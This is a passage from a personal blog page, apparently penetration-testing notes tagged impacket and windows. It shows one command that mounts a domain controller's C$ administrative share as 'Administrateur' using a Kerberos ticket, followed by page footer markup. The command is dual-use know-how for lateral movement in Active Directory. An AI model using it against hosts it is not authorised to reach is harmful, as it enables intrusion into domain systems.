+<h2 id="mountings-cifs-with-kerberos-ticket">Mountings CIFS with KERBEROS TICKET</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ sudo mount -t cifs -o <span style="color:#e6db74">&#34;sec=krb5,cruid=</span>$UID<span style="color:#e6db74">,user=Administrateur,domain=FOO.BAR&#34;</span> //AD1.FOO.BAR/C$ /mnt/test -vvv</code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+                <p>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg><span class="tag"><a href="https://kaluche.github.io/tags/impacket">impacket</a></span><span class="tag"><a href="https://kaluche.github.io/tags/windows">windows</a></span>
+                </p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><line x1="16" y1="13" x2="8" y2="13"></line><line x1="16" y1="17" x2="8" y2="17"></line><polyline points="10 9 9 9 8 9"></polyline></svg>1021 Words</p>
+
+            <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>2020-02-01 17:05 &#43;0100</p>
+        </div>
+
+        
+            <div class="pagination">
+                <div class="pagination__title">
+                    <span class="pagination__title-h"></span>
+                    <hr />
+                </div>
+
+                <div class="pagination__buttons">
+                    
+                        <span class="button previous">
+                            <a href="https://kaluche.github.io/posts/2020/02/powershell/">
+                                <span class="button__icon">←</span>
+                                <span class="button__text">Powershell</span>
+                            </a>
+                        </span>
+                    
+
+                    
+                </div>
+            </div>
+        
+
+        
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2020</span>
+            
+                <span><a href="https://kaluche.github.io">Kaluche</a></span>
+            
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span> <a href="https://kaluche.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+        </div>
+    </div>
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
+            <span>Made with &#10084; by <a href="https://github.com/rhazdon">rhazdon</a></span>
+        </div>
+    </div>
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+
+<script type="text/javascript" src="https://kaluche.github.io/bundle.min.2d5469329143160ae2456a69c3c76dc2d0a3b212b46afe291a51bd68650ed6f8697e001dab54f1c272c77ce08092a8c55e5bb4314e0ee334aab4b927ec896638.js" integrity="sha512-LVRpMpFDFgriRWppw8dtwtCjshK0av4pGlG9aGUO1vhpfgAdq1TxwnLHfOCAkqjFXlu0MU4O4zSqtLkn7IlmOA=="></script>
+
+
+
+    </body>
+</html>
